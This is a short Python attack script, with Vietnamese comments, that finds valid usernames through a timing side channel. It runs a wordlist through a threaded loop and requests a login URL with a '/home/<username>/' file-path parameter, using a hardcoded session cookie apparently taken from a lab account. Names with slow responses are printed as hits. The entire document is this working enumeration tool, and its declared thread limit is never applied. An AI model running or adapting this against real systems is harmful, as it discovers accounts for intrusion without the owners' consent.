import threading
import requests

# Định nghĩa các hằng số
WORDLIST = '/a.txt'
URL = 'http://example.com/login'
cookies = {"session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZCh4Qw.Lv94ak_WPWEN8Idhwf7l-3a5MH4"}

THRESHOLD_A = 0.02
MAX_THREADS = 50

semaphore = threading.Semaphore(MAX_THREADS)

def check_username(username):
    username = username.strip()
    r = requests.get(URL, params={"filepath": f"/home/{username}/"}, cookies=cookies)

    if r.elapsed.total_seconds() > THRESHOLD_A:
        print(f"{username}")

# Đọc tệp wordlist và tạo các luồng
threads = []

with open(WORDLIST, 'r') as f:
    for username in f:
        thread = threading.Thread(target=check_username, args=(username,))
        threads.append(thread)
        thread.start()

# Đợi tất cả các luồng hoàn thành
for thread in threads:
    thread.join()

print("Finished all threads")
